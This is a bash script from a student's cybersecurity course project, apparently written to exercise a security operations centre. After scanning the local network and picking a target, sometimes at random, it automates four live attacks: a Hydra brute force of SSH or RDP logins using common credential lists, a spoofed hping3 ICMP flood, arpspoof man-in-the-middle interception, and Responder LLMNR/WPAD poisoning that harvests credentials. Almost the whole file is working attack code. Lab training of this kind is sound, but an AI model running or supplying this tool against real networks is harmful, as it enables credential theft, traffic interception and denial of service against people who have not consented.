#!/usr/bin/bash

# Student name: Alex Kong
# Student code: s3
# Unit / Class code: cfc130623
# Trainer name: James Lim

# Project: SOC Checker (SOC Analyst)

##################################################################################################################
##################################################################################################################

# create a  banner title for the bash script using figlet and echo command
# list some global variables for the SOC checker script
# create a log for recording SOC checker process

# Global variables
# set a global time variable of scan to UTC time with a -u flag
time_stamp=$(date -u)
	
# create a soc.log file to track the attack selection and save into /var/log directory
# log_file as a global variable to track the attack selection such as type of attack, time of execution and IP addresses involved between the target and attacker.
log_file="/var/log/soc.log"
touch $log_file


function banner_info()
{
	# -c flag center the output horizontally.
	# -t sets the output terminal width.
	# -e flag enable interpretation of backslash escapes "\e...............\e"
	# [36m - specify ANSI colour text to cyan
	# [0 - resets colour default terminal colour 
	# $() - accepts figlet commands in echo command
	
	echo -e "\e[32m$(figlet -tc ///////////////)\e[0m"
	echo -e "\e[33m$(figlet -tc The SOC Checker)\e[0m"
	echo -e "\e[32m$(figlet -tc ///////////////)\e[0m"
	echo " "
	echo -e "\e[36m[+] $time_stamp - Starting the SOC checker in the network.\e[0m"
	
	# create a log file
	echo -e "\e[36m[+] $time_stamp - Creating a soc.log file in \e[97m/var/log.\e[0m"
	# include a title in the soc.log file 
	# needs to run this bash script as "sudo bash soc.sh or sudo ./soc.sh" to save log file in /var/log 
	echo " =================================================== SOC Checker Report =================================================== " >> $log_file
	echo " " >> $log_file
	echo "[+] $time_stamp - A SOC checker log is created." >> $log_file
	
}



##################################################################################################################
############################################### Tool requirements ################################################

# function to check if tools are installed to run the SOC Checker script

function check_tool()
{
	echo " "
	echo -e "\e[36m[+] Checking dependencies for SOC Checker ..... \e[0m"
	
	# if else checks for the package exist in the system
	# dpkg -1 to list out all packages in linux
	# grep -q flag suppresses  all normal output
	# ^ii\s* - ^ starts with ii characters on the line and \s* is the spacing from package name
	
	# nmap tool
	if dpkg -l | grep -q '^ii\s*nmap'
	then
		echo -e "\e[32m[*] nmap is installed.\e[0m"
	else
		echo -e "\e[31m[!] nmap is not installed.\e[0m"
		echo -e "\e[36m[*] Installing nmap ......... \e[0m"
		sudo apt-get update
		sudo apt-get install -y nmap
	fi
	
	# Hydra tool for Bruteforce attack
	if dpkg -l | grep -q '^ii\s*hydra-gtk'
	then
		echo -e "\e[32m[*] Hydra is installed.\e[0m"
	else
		echo -e "\e[31m[!] Hydra is not installed.\e[0m"
		echo -e "\e[36m[*] Installing Hydra ......... \e[0m"
		sudo apt-get update
		sudo apt-get install -y hydra-gtk
	fi
	
	# dsniff tool for arpspoofing attack
	if dpkg -l | grep -q '^ii\s*dsniff'
	then
		echo -e "\e[32m[*] dsniff (arpspoof tool) is installed.\e[0m"
	else
		echo -e "\e[31m[!] dsniff (arpspoof tool) is not installed.\e[0m"
		echo -e "\e[36m[*] Installing dsniff ......... \e[0m"
		sudo apt-get update
		sudo apt-get install -y dsniff
	fi

	# hping3 tool for Flood DoS attack
	if dpkg -l | grep -q '^ii\s*hping3'
	then
		echo -e "\e[32m[*] hping3 is installed.\e[0m"
	else
		echo -e "\e[31m[!] hping3 is not installed.\e[0m"
		echo -e "\e[36m[*] Installing hping3 ......... \e[0m"
		sudo apt-get update
		sudo apt-get install -y hping3
	fi


	# responder tool for LLMNR attack
	if dpkg -l | grep -q '^ii\s*responder'
	then
		echo -e "\e[32m[*] responder is installed.\e[0m"
	else
		echo -e "\e[31m[!] responder is not installed.\e[0m"
		echo -e "\e[36m[*] Installing responder ......... \e[0m"
		sudo apt-get update
		sudo apt-get install -y responder
	fi

	echo " "
	echo -e "\e[36m[+] All tools installed. \e[0m"
	echo -e "\e[36m[+] Proceeding to network scanning of the network .......... \e[0m"
	
	
}



##################################################################################################################
############################################# Network Information ################################################

# check the system on the network for possible target IP addresses
# the network is on a specific submask of 255.255.255.0 with CIDR of 24
# reveal the attacker IP address and is on the same network as the target
# the target can be either Windows OS or Linux OS may require a service detection.
# the attacker machine must be on the same network as the target machines.

function network_check() 
{
	echo -e "\e[36m[+] $time_stamp - Checking attacker information.\e[0m" | tee -a $log_file
	# checks  on attacker IP address and OS type
	attacker_ip=$(ifconfig | grep 'broadcast' | awk '{print $2}')
	attacker_device_os=$(uname -a | awk '{print $1}')
	default_gateway=$(ip route | grep default | awk '{print $3}')


	# check if the attacker information are correct.
	# ! -z checks for the value found is not empty
	# IP address of attacker
	if [ ! -z "$attacker_ip" ] 
	then 
		echo -e "\e[32m[+] $time_stamp - The attacker IPv4 address is \e[97m$attacker_ip\e[32m.\e[0m"  | tee -a $log_file
	else
		echo -e "\e[31m[!] $time_stamp - No input, please recheck your network settings.\e[0m"  | tee -a $log_file
		# exits if error is found in the network checking.
		exit 1
	fi
	
	# Attacker machine OS type
	if [ ! -z "$attacker_device_os" ] 
	then 
		echo -e "\e[32m[+] $time_stamp - The attacker OS is \e[97m$attacker_device_os\e[32m.\e[0m"  | tee -a $log_file
	else
		echo -e "\e[31m[!] $time_stamp - No input, please recheck your network settings.\e[0m"  | tee -a $log_file
		# exits if error is found in the network checking.
		exit 1
	fi
	
	# Default gateway of the network
	if [ ! -z "$default_gateway" ] 
	then 
		echo -e "\e[32m[+] $time_stamp - The default gateway of the network is \e[97m$default_gateway\e[32m.\e[0m"  | tee -a $log_file
	else
		echo -e "\e[31m[!] $time_stamp - No input, please recheck your network settings.\e[0m"  | tee -a $log_file
		# exits if error is found in the network checking.
		exit 1
	fi


	# Use the default gateway as a reference to determine the first 3 octets of the network
	first3octets=$(ip route | grep default | awk '{print $3}' | cut -d "." -f 1,2,3)
	echo -e "\e[36m[+] $time_stamp - Checking the first 3 octets in LAN network and it is \e[97m$first3octets\e[0m" | tee -a $log_file
	
	# Check for available target machines in the network.
	echo -e "\e[36m[+] $time_stamp - Scanning for possible targets of attacks in the network.\e[0m" | tee -a $log_file

	
	# Check the network for available target and stored a folder	
	# netdiscover -r $first3octets.0/24
	nmap -sn $first3octets.0/24 > sn.log

	# filter nmap results for ip addresses only 
	cat sn.log | grep -w "scan" | awk '{print $NF}' | sort > sorted_ip.log
	# no needed for soc checker
	rm sn.log
	
	# exclude the certain IP address as it is not related.
	# They are host machine, NAT device or LAN device, DHCP server, broadcasting, attacker IP
	# declare the variables to exclude
	host_machine=$first3octets.1
	nat_device=$first3octets.2
	dhcp_server=$first3octets.254
	broadcasting=$first3octets.255

	# define the start count as 0 for ip addresses.
	count=0
	
	echo -e "\e[36m[+] $time_stamp - Found some targets for cyber attacks in the network.\e[0m" 
	# display the found IP addresses in the network
	echo " " 
	cat sorted_ip.log 
	echo " "
	echo -e "\e[36m[+] Counting and filtering the number of target machines for attacks.\e[0m" 
	
	# Loop over a list of found live target hosts based on last octet(from 3 - 253) 
	for device in $(cat sorted_ip.log)
	do 
		# if else to exclude out the host machine, NAT device, DHCP server, broadcasting and attacker IP
		if [[ $device != $host_machine && $device != $nat_device && $device != $dhcp_server && $device != $broadcasting && $device != $attacker_ip ]]
		then 
			echo -e "\e[32m[+] $time_stamp - \e[97m$device\e[32m is found in the current network.\e[0m"  | tee -a $log_file
			# counts each found target in the loop
			((count += 1))
		fi 
		# save the results to a file to anaylse further
	done >>  filter.log  
	
	# display the results in for loop
	echo " "
	cat filter.log
	echo " "
	
	# output the count of targets
	echo -e "\e[36m[+] $time_stamp - There are \e[97m$count\e[36m targets found in the current network.\e[0m"  | tee -a $log_file
	echo " "
	

	# remove file 
	rm sorted_ip.log
}



##################################################################################################################
############################################# Target Selection ###################################################


# Ask the attacker if the target manually input or randomly selected to attack.

function generate_random_target() 
{
	# declare variables to generate potential targets randomly
	cat filter.log | grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > ip.log
	
	# generate a random target using shuf command
	# -n flag to head count only one target for output
	random_target=$(shuf -n 1 "ip.log")
	
	# print the random target IP address
	echo -e "\e[32m[+] $time_stamp - The chosen random target is \e[97m$random_target\e[0m"  | tee -a $log_file
	
	# find the target machine os and need to run as sudo
	# target os as a variable
	target_os=$(nmap -O -sV $random_target | grep "Service Info:" | awk '{print $4}' | sed 's/;//g')
	echo -e "\e[32m[+] $time_stamp - The random target machine os is: \e[97m$target_os\e[0m" | tee -a $log_file
	
}

# main target selection function for random or manual input

function target_select()
{
	# Ask for target machine input
	read -p "[+] Do you want to enter the target IP address manually?(yes/no): " user_choice
	echo " "
	
	#  if else to check on random or manual select target from found IP addresses in network
	if [ "$user_choice" == "yes" ]
	then 
		# manual input of target IP address
		read -p "[+] Please enter the target IP: " user_value
		echo -e "\e[32m[+] $time_stamp - The manual input of target is \e[97m$user_value\e[32m.\e[0m"  | tee -a $log_file
		# find the target os
		target2_os=$(nmap -O -sV $user_value | grep "Service Info:" | awk '{print $4}' | sed 's/;//g')
		echo -e "\e[32m[+] $time_stamp - The manual input of target machine os is: \e[97m$target2_os\e[0m" | tee -a $log_file
	else 
		generate_random_target
	fi	
	
	echo " "
	
	# remove file
	rm filter.log
	
	# Resort the target IP address either manual choice or random as one variable for attack
	# -n flag - string value is not null or empty
	if [ -n "$user_value" ] 
	then
		# manual selected target IP
		target="$user_value"
	else
		# random selected target IP
		target="$random_target"
	fi
	
	
	# Define the global variables of various attacks to use
	# check the os of target machine
	check_os=$(nmap -O -sV $target | grep "Service Info:" | awk '{print $4}' | sed 's/;//g')
	# attacker NIC network interface
	attacker_interface=$(ip route | grep default | awk '{print $5}')
	# attacker MAC address
	attacker_mac=$(ifconfig | grep ether | awk '{print $2}')
	

}





##################################################################################################################
################################################ Attack Types ####################################################

# functions for attack types and descriptions



################################################## Attack 1 ######################################################

function attack1() 
{
		echo -e "\e[36m[+] $time_stamp - Attack 1: Bruteforce User Credentials with Hydra\e[0m" | tee -a $log_file
		echo -e "\e[36m[+] Description: \e[97m Hydra is an online bruteforce tool which uses a trial and error combinations through rapid dictionary of potential valid usernames 
		and passwords or own created list to attack with more the 50 protocols/services such as FTP, SSH, SMB, RDP services.\e[0m"
		echo -e "\e[36m[+] $time_stamp - Executing bruteforce attack on \e[97m$target\e[0m" | tee -a $log_file
		
		# os of target machine
		echo -e "\e[36m[+]$target is \e[97m$check_os OS.\e[0m"
		
		
		# declare a list or array of common usernames and passwords lists for Linux or Windows
		# can use a file of usernames and passwords
		usernames=("root" "admin" "user" "test" "ubuntu" "345gs5662d34" "nproc" "postgres" "oracle" "ftpuser" "kali" "IEUser" "Administrator")
		passwords=("shadow" "password" "12345678" "qwerty" "letmein" "123123" "dragon" "111111" "monkey" "iloveyou" "kali" "Passw0rd!" "admin")
		
		# convert the lists as a file for hydra command to use for the attack
		# "%s\n" assign each value on a separate line 
		printf "%s\n" "${usernames[@]}" > users.lst
		printf "%s\n" "${passwords[@]}" > pass.lst
		
		# specify service type of attack based on OS type 
		read -p "[+] Please specify to service of attack as ssh (Linux) or rdp (Windows): " service 
		echo " "
		# use hydra command to bruteforce with user and password lists' files
		# -L for using a user list
		# -P for using a password/user list
		# -vV verbose mode
		# $target - input host IP address
		# $service - service type in network
		# -o to save the successful login usernames and passwords in a file
		hydra -L users.lst -P pass.lst $target $service -vV -o results.txt
		
		# grep user and password login successfully from results
		user=$(cat results.txt | grep login | awk '{print $5}')
		password=$(cat cat results.txt | grep password | awk '{print $7}')

		# if else to check for successfully login attempts by bruteforcing.
		# -q flag suppress normal output
		# -E flag select regular expression patterns
		if grep -q -E "login:|password:" results.txt
		then 
			# declare the successful login details for records
			echo -e "\e[32m[+] $time_stamp - Successful login found in bruteforcing with Hydra !!! \e[0m" | tee -a $log_file
			echo -e "\e[32m[+] $time_stamp - Found username is \e[97m$user \e[32m and password is \e[97m$password \e[0m" | tee -a $log_file
			echo -e "\e[32m[+] $time_stamp - Target host: \e[97m$target \e[32m in bruteforcing with Hydra.\e[0m" | tee -a $log_file
		else
			echo -e "\e[31m[!] $time_stamp - All login attempts failed in bruteforcing attack! \e[0m" | tee -a $log_file
		fi
		
		# remove unnecessary files
		rm results.txt
		rm users.lst
		rm pass.lst
		
		echo -e "\e[36m[+] Exiting Hydra ...... \e[0m"
}


################################################## Attack 2 ######################################################


function attack2() 
{
		echo -e "\e[36m[+] $time_stamp - Attack 2: Distributed Denial of Service (DDoS) - DoS Smurf Attack with ICMP pings \e[0m" | tee -a $log_file
		echo -e "\e[36m[+] Description: \e[97m DoS Smurf Attack is a malicious attack to the network service unavailable to users by flooding the network. DoS smurf attack is 
		a ICMP protocol-base attack by pinging target ip addresses. \e[0m"
		echo -e "\e[36m[+] $time_stamp - Executing DDoS Smurf attack on \e[97m$target\e[0m " | tee -a $log_file
		
		# define a variable for fake IP address to hide attacker IP
		fake_ip="192.168.25.20"
		echo -e "\e[36m[+] Fake IP for DDoS Smurf attack is \e[97m$fake_ip\e[0m"

		# need sudo to run hping3 command to run icmp ping to flood the network of target machine
		# --icmp - mode type on as TCP/UDP/ICMP
		# --spoof - specify spoofed source IP and target IP addresses 
		# --flood - send packets as fast as possible.
		echo -e "\e[36m[+] Open wireshark on target to monitor for DDoS Smurf attacks.\e[0m"
		echo -e "\e[36m[+] ICMP flooding with Hping3 command ..... \e[0m"
		# check if DDoS Smurf attack occurs
		echo -e "\e[36m[+] If DDoS attack occurs, 'Ctrl + C' to end hping3 process.\e[0m"
		# Running hping3 command
		sudo hping3 --icmp --flood --spoof $fake_ip $target
		
		# allow some time delay
		sleep 5
		
		echo -e "\e[32m[+] $time_stamp - DDos Smurf attack is done on \e[97m$target\e[0m" | tee -a $log_file
		echo -e "\e[36m[+] Exiting DDoS attack ...... \e[0m"		
}


################################################## Attack 3 ######################################################


function attack3() 
{
		echo -e "\e[36m[+] $time_stamp - Attack 3: ARP spoofing Attack\e[0m" | tee -a $log_file
		echo -e "\e[36m[+] Description: \e[97m It is a type of Man-in-the-Middle attack when the attacker is inside local network and intercept 
		the network communications by impersonating a known machine in the network. \e[0m"
		echo -e "\e[36m[+] $time_stamp - Executing ARP spoofing attack on \e[97m$target\e[0m" | tee -a $log_file
		
		
		# grep information for arpspoofing
		# default gateway information	
		# check current default gateway mac address before arpspoofing attack
		# xargs pass the default gateway IP address from (ip route | grep default | awk '{print $3}'
		dg_mac=$(ip route | grep default | awk '{print $3}' | xargs arp -n | awk 'NR==2 {print $3}')
	
		echo -e "\e[36m[+] The default gateway is \e[97m$default_gateway \e[36m & MAC address \e[97m$dg_mac\e[0m"
		
		
		# Check for information about the attacker
		echo -e "\e[36m[+] The attacker network interface is \e[97m$attacker_interface.\e[0m"
		echo -e "\e[36m[+] The attacker MAC address is \e[97m$attacker_mac.\e[0m"
		
		# Check arp table on target before attack
		echo -e "\e[36m[+] Check the ARP table on target machine before arpspoofing attack with 'arp -a' command \e[0m"
		
		# enable port forwarding of packets
		# 1 = yes and 0 = no.
		echo -e "\e[36m[+] Enabling the forwarding of packets.\e[0m"
		echo 1 > /proc/sys/net/ipv4/ip_forward
		
		# allow time to check the ARP table on target
		sleep 5
		
		# perform arpspoofing process
		# execute the arpspoofing command with sudo/ admin rights
		# -i flag specify the interface 
		# -t flag specify the target host to poison
		echo -e "\e[36m[+] Running arpspoofing attack ........ \e[0m"
		arpspoof -i $attacker_interface -t $target $default_gateway &
		arpspoof -i $attacker_interface -t $default_gateway $target & 
		
		# Allow time for arpspoofing to take effect for 5 secs
		sleep 5
		
		# check arp table on target after attack
		# if default gateway contains same MAC address as attacker's 
		# Prompt to check ARP table of target after arpspoofing started.
		echo " "
		echo -e "\e[36m[+] Recheck ARP table on target with 'arp -a' if it contains duplicates MAC addresses (yes/no).\e[0m"  
		echo " "
		read -r reply
		echo " "
	
		# check if duplicates MAC addresses occur on target	
		if [[ "$reply" == "yes" ]]
		then
			echo -e "\e[32m[+] $time_stamp - ARP spoofing is successful on \e[97m$target.\e[0m" | tee -a $log_file
			echo " "
		else
			echo -e "\e[31m[!] $time_stamp - ARP spoofing did not succeed.\e[0m" | tee -a $log_file
			echo " "
		fi
		
			
		# prompt to exit the arpspoofing attack
		echo " "
		read -p "[+] Press any key to stop ARP spoofing process ..... "
		echo " "
		echo -e "\e[36m[+] Exiting Arpspoofing attack ...... \e[0m"
}


################################################## Attack 4 ######################################################

function attack4() 
{
		echo -e "\e[36m[+] $time_stamp - Attack 4: LLMNR Poisoning (Windows only)\e[0m" | tee -a $log_file
		echo -e "\e[36m[+] Description: \e[97m Link-Local  Multicast Name Resolution is another Man-in-the-middle attack which sends out multicast queries on 
		local network for any machines contain certain names and respond it back to attacker. LLMNR needs to be enable in Windows to work. \e[0m"
		echo -e "\e[36m[+] $time_stamp - Executing the LLMNR attack on \e[97m$target\e[0m" | tee -a $log_file
		
		# check target meets requirements for LLMNR and NIC network interface
		echo -e "\e[36m[+] Checking target OS for comparability ...... \e[0m" 
		
		# Check if target machine is Windows OS
		# need to sudo to check the os detection on target device
		# this work if windows RDP open and ssh open on linux
		# convert all strings on target os to lowercase for ease of checking on Windows OS for LLMNR attack
		if [[ "$check_os" == "Windows" ]]
		then 
			echo -e "\e[36m[+] $time_stamp - Confirmed the target machine is a \e[97mWindows OS.\e[0m" | tee -a $log_file
		else 
			echo -e "\e[31m[!] $time_stamp - Wrong OS type for LLMNR attack. Please select other attack options.\e[0m" | tee -a $log_file
			# exit the function for this attack
			exit 
		fi
		
		# Check attacker network interface
		echo -e "\e[36m[+] $time_stamp - Checked attacker network interface is \e[97m$attacker_interface.\e[0m"  | tee -a $log_file
	
		# Start LLMNR
		echo -e "\e[36m[+] LLMNR attack continues ......... \e[0m"
		
		# LLMNR through WPAD
		echo -e "\e[36m[+] Method 1 - LLMNR through WPAD by keying in 'wpad.local' as invalid URL in target's web browser.\e[0m"
		# LLMNR through SMB
		echo -e "\e[36m[+] Method 2 - LLMNR through SMB by keying wrong shared folder name in target machine.\e{0m"
		echo -e "\e[36m[+] Confirmed if target information is captured, use 'Ctrl + C' to end and return to rest of function.\e[0m"
		echo " "
		
		# execute the responder command
		# need sudo/ admin rights to run the command
		# -I - use the default NIC network interface which the attacker one.
		# -w - configure WPAD rogue proxy server
		# -d - DHCP injection as optional 
		# -F - to force basic authentication on target machine
		# -b - gain clear text credentials using basic authentication
		# -v - verbose mode
		responder -I $attacker_interface -wdF -b -v
		
		echo " "
		echo -e "\e[36m[+] Checking if LLMNR attack has obtained the user credentials. \e[0m"
		
		# Checking LLMNR attack through WPAD
		# file path to responder logs
		file_path="/usr/share/responder/logs"
		
		# responder log file with clear text credentials
		file_to_find="*$target.txt"
		
		# find command to search for a specific file in responder logs directory
		found_file=$(find "$file_path" -type f -name "$file_to_find")
		
		# LLMNR through SMB and file path
		found_file2=$(find "$file_path" -type f -name 'SMB-NTLMv2-SSP*')     

		echo $found_file2
		
		
		
		# if-else statement to check that user credential file exists and cat its contents in terminal
		# is not an empty string with no contents
		if [ -n "$found_file" ]
		then 
			# output to soc.log if LLMNR attack is success.
			echo -e "\e[36m[+] User credentials obtained..... \e[0m"
			echo " "
			cat "$found_file"
			echo " "
			echo -e "\e[32m[+] $time_stamp - LLMNR attack through WPAD is successfully done on \e[97m $target. \e[0m" | tee -a $log_file
		elif [ -n "$found_file2" ]
		then 	
			echo -e "\e[36m[+] User credentials obtained..... \e[0m"
			echo " "
			cat "$found_file2"
			echo " "
			echo -e "\e[32m[+] $time_stamp - LLMNR attack through SMB is successfully done on \e[97m $target. \e[0m" | tee -a $log_file
		else
			# reply unsuccessful attempt and exit the function
			echo -e "\e[31m[!] $time_stamp - LLMNR attack is unsuccessfully. \e[0m" | tee -a $log_file
			exit
		fi
		
		# End of LLMNR attack
		echo -e "\e[36m[+] Exiting LLMNR attack ...... \e[0m"
		
}



######################################################################################################################
################################################ Attack Selection ####################################################

function attack_select()

{
	echo -e "\e[36m[+] Starting AttacK ....... \e[0m "
	echo " "

	# Display available attacks
	echo -e "\e[36m[+] Available Type of Attacks are: \e[0m"
	echo -e "\e[36m[+] 1. Bruteforce User Credentials with Hydra \e[0m"
	echo -e "\e[36m[+] 2. DoS Smurf Attack with ICMP \e[0m"
	echo -e "\e[36m[+] 3. ARP spoofing Attack \e[0m"
	echo -e "\e[36m[+] 4. LLMNR Poisoning (Windows only) \e[0m"
	echo -e "\e[36m[+] 5. Random Cyber Attacks \e[0m"

	# Prompt user to choose an attack
	read -p "[+] Choose one type of attack: " choice 
	# input the attack choice to soc.log
	echo -e "\e[36m[+] $time_stamp - the chosen attack is \e[97m$choice.\e[0m" | tee -a $log_file
                                  

    # declare a single target as a variable for attack
	echo -e "\e[36m[+] Reconfirm the target IP address for penetration testing: \e[97m$target\e[0m"
	echo " "
	
	# Execute the chosen attack or a random attack
	case $choice in
		1)
			attack1
			;;
		2)
			attack2
			;;
		3)
			attack3
			;;
		4)
			attack4
			;;
		5)
		# Generate a random number between 1 to 4
		# value 4 is the length of the attack choices
			random_attack=$((1 + $RANDOM % 4))
			echo -e "\e[36m[+] $time_stamp - The chosen random attack is \e[97m $random_attack \e[36m.\e[0m " | tee -a $log_file
        
		# Execute the randomly chosen attack
			case $random_attack in
				1)
					attack1
					;;
				2)
					attack2
					;;
				3)
					attack3
					;;
				4)
					attack4
					;;
			esac
			;;
        # wildcard * if input wrong choice and exit the script.
		*)
        echo -e "\e[31m[!] Invalid choice. Exiting..... \e[0m"
        exit 1
        ;;
	esac
}

#############################################################################################################################
################################################ Main Automation Fuction ####################################################

function main()
{
	banner_info
	check_tool
	network_check
	target_select
	attack_select
	
	echo -e "\e[36m[+] Exiting SOC Checker ............ \e[0m"
	echo -e "\e[36m[+] Thank you! \e[0m"
	echo -e "\e[36m[+] Designed by Alex Kong. \e[0m"

}

main
